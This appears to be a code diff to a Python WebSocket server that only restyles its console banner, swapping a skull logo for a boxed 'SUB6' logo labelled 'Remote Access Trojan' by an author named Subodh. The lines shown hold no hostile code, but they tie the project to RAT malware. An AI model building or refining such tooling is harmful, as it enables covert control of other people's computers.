@@ -2191,7 +2191,7 @@ class WebSocketServer:
                     print(f"[!] Error: {e}")
     
     def print_banner(self):
-        """Print ASCII banner with skull"""
+        """Print ASCII banner"""
         # ANSI color codes
         RED = '\033[91m'
         GREEN = '\033[92m'
@@ -2203,16 +2203,16 @@ class WebSocketServer:
         RESET = '\033[0m'
         
         print()
-        print(f"{RED}      ____{RESET}")
-        print(f"{RED}     /    \\{RESET}")
-        print(f"{RED}    | {WHITE}o  o{RESET}{RED} |{RESET}   {CYAN}{BOLD}U   U  BBBB    6666{RESET}")
-        print(f"{RED}    |  ^^  |{RESET}   {CYAN}{BOLD}U   U  B   B  6    {RESET}")
-        print(f"{RED}    | \\__/ |{RESET}   {CYAN}{BOLD}U   U  BBBB   6666 {RESET}")
-        print(f"{RED}     \\____/{RESET}    {CYAN}{BOLD}U   U  B   B  6   6{RESET}")
-        print(f"{RED}      |  |{RESET}     {CYAN}{BOLD}UUUUU  BBBB    666 {RESET}")
-        print()
-        print(f"              {YELLOW}[ Remote Access Trojan ]{RESET}")
-        print()
+        print(f"{RED}+----------------------------------------------------------------------+{RESET}")
+        print(f"{RED}|                                                                      |{RESET}")
+        print(f"{RED}|{RESET}                   {CYAN}{BOLD}SSSSS  U   U  BBBB    6666{RESET}                         {RED}|{RESET}")
+        print(f"{RED}|{RESET}                   {CYAN}{BOLD}S      U   U  B   B  6    {RESET}                         {RED}|{RESET}")
+        print(f"{RED}|{RESET}                   {CYAN}{BOLD}SSSSS  U   U  BBBB   6666 {RESET}                         {RED}|{RESET}")
+        print(f"{RED}|{RESET}                   {CYAN}{BOLD}    S  U   U  B   B  6   6{RESET}                         {RED}|{RESET}")
+        print(f"{RED}|{RESET}                   {CYAN}{BOLD}SSSSS  UUUUU  BBBB    666 {RESET}                         {RED}|{RESET}")
+        print(f"{RED}|                                                                      |{RESET}")
+        print(f"{RED}|{RESET}                  {YELLOW}   [ Remote Access Trojan ]{RESET}                         {RED}|{RESET}")
+        print(f"{RED}|                                                                      |{RESET}")
         print(f"{RED}+----------------------------------------------------------------------+{RESET}")
         print(f"{RED}|{RESET}   {WHITE}Author{RESET}  : {GREEN}Subodh{RESET}                                                   {RED}|{RESET}")
         print(f"{RED}|{RESET}   {WHITE}Version{RESET} : {GREEN}1.0{RESET}                                                      {RED}|{RESET}")
